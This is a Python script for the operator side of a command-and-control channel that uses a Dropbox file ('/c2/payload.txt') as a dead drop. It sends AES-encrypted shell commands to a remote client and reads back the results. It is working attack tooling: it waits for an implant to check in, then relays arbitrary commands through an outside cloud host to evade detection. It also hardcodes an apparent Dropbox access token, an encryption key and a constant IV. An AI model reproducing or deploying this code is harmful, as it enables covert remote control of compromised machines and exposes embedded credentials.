import dropbox
import dropbox.files 
import os
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# Aes-128 Encryption
def encrypt_message(message):
    cipher = AES.new(key, AES.MODE_CBC, IV=CONST_IV)
    ct_bytes = cipher.encrypt(pad(message.encode(), AES.block_size))
    iv = cipher.iv
    return ct_bytes

# Aes-128 bit Decryption
def decrypt_message(ct_bytes):
    cipher = AES.new(key, AES.MODE_CBC, iv=CONST_IV)
    pt = unpad(cipher.decrypt(ct_bytes), AES.block_size)
    return pt.decode()

# Take user input and write it to the dropbox file
def write_cmd():
    command = input('$ ')
    encrypted_command = encrypt_message(command)

    try:
        dbx.files_upload(encrypted_command, dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
        print("[+] Command written to Dropbox Server")
        if command == 'exit':
            exit(0)
        time.sleep(10)
        read_output()
    except dropbox.exceptions.ApiError as err:
        print(f"Error while overwriting file: {err}")
    
# Read the output written by the client from the dropbox file
def read_output():
    _, response = dbx.files_download(dropbox_path)
    command = response.content
    command = decrypt_message(command)
    print('[+] Successfully read output from Dropbox file')
    print(f'output->{command}')
    


if __name__ == '__main__':
    key = "564cybereffectss".encode()
    CONST_IV = 'qwertyuiopasdfgh'.encode()


    # Dropbox token
    token = "sl.Bz--6Bn-VLUuToNivoPDz9Q8LTT-AWRSBRmYUAMh8fQEDGJp2DmTOf-ILf7CwDg0iWsTFk_3o4H3VD4hQzEngpolAEVjdDBopAwqv0xgi1ssfwS1htYK_HRaViJLF1i9J2UVgY308EyooO5NnyGw"

    dbx = dropbox.Dropbox(token)
    dropbox_path = '/c2/payload.txt'

    # Check if the client has started
    while True:
        _, response = dbx.files_download(dropbox_path)
        msg = response.content
        msg = decrypt_message(msg)

        if msg == 'Client Started':
            print("[+] Client connected")
            break
        else:
            print("[-] Waiting for the client to connect")
            time.sleep(10)

    # start payload execution
    while True:
        write_cmd()






